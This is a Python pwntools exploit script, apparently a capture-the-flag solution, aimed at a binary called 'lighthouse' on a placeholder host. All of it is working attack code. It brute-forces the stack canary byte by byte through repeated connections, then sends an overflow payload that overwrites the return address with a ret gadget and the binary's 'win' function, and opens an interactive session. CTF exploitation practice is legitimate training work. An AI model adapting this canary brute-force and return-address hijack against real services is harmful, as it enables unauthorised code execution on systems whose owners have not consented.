#!/usr/bin/env python3
from pwn import *

exe = ELF('./lighthouse', checksec=False)
context.binary = exe
context.os     = 'linux'
context.arch   = 'amd64'

HOSTNAME = 'HOSTNAME_PLACEHOLDER'
PORT     = 0  # PORT_PLACEHOLDER

OFFSET_TO_CANARY = 136
OFFSET_TO_RIP    = 152
GADGET           = 0x000000000040101a

def conn(interactive=False):
    level = 'info' if interactive else 'error'
    if args.LOCAL:
        return remote('127.0.0.1', 9001, level=level)
    return remote(HOSTNAME, PORT, level=level)

def try_byte(known, bval):
    r = conn()
    try:
        r.recvuntil(b'> ', timeout=2)
        r.sendline(b'1')
        r.recvuntil(b'entry: ', timeout=2)
        r.send(b'A' * OFFSET_TO_CANARY + known + bytes([bval]))
        data = r.recvall(timeout=1)
        r.close()
        return b'recorded' in data
    except Exception:
        r.close()
        return False

def main():
    known = b'\x00'
    for i in range(7):
        p = log.progress(f'Bruteforcing byte {i+1}')
        for bval in range(256):
            p.status(f'Trying {bval:#04x}')
            if try_byte(known, bval):
                known += bytes([bval])
                p.success(f'Found: {bval:#04x}, canary so far: {known.hex()}')
                break
        else:
            p.failure('Failed to find byte')

    canary = u64(known)
    log.success(f'canary = {canary:#x}')

    r = conn(interactive=True)
    r.recvuntil(b'> ')
    r.sendline(b'1')
    r.recvuntil(b'entry: ')

    payload = flat(
        b'A' * OFFSET_TO_CANARY,
        p64(canary),
        b'B' * (OFFSET_TO_RIP - OFFSET_TO_CANARY - 8),
        p64(GADGET),
        p64(exe.sym.win),
    )
    r.send(payload)
    r.interactive()


if __name__ == '__main__':
    main()
